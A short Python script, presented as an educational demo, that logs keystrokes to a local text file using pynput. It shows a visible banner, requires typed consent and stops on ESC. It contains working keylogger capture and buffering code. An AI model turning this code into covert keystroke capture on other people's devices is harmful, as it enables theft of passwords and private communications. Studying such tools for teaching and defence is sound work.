import datetime
import os
import sys

try:
    from pynput import keyboard
except ImportError:
    print("This script requires 'pynput'. Install it with: pip install pynput")
    sys.exit(1)

LOG_FILE = "keystroke_log.txt"
_buffer = []


def log_line(text: str):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {text}\n")


def on_press(key):
    try:
        char = key.char
        _buffer.append(char)
    except AttributeError:
        name = str(key).replace("Key.", "")
        if name == "space":
            _buffer.append(" ")
        elif name == "esc":
            flush_buffer()
            log_line("--- Logging stopped (ESC pressed) ---")
            print(f"\nStopped. Log saved to: {os.path.abspath(LOG_FILE)}")
            return False
        else:
            _buffer.append(f"[{name.upper()}]")

        if name in ("enter", "tab"):
            flush_buffer()


def flush_buffer():
    if _buffer:
        log_line("".join(_buffer))
        _buffer.clear()


def main():
    print("=" * 60)
    print("  KEYSTROKE LOGGER — SECURITY RESEARCH / EDUCATIONAL DEMO")
    print("=" * 60)
    print("This tool is logging keystrokes to a LOCAL file on this")
    print(f"machine only:  {os.path.abspath(LOG_FILE)}")
    print("No data leaves this computer. Press ESC to stop.")
    print("=" * 60)

    consent = input(
        "Type YES to confirm you own this device and consent to this "
        "demo logging your own keystrokes locally: "
    ).strip()
    if consent != "YES":
        print("Consent not given — exiting without logging anything.")
        return

    log_line("--- Logging started (consented local demo) ---")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()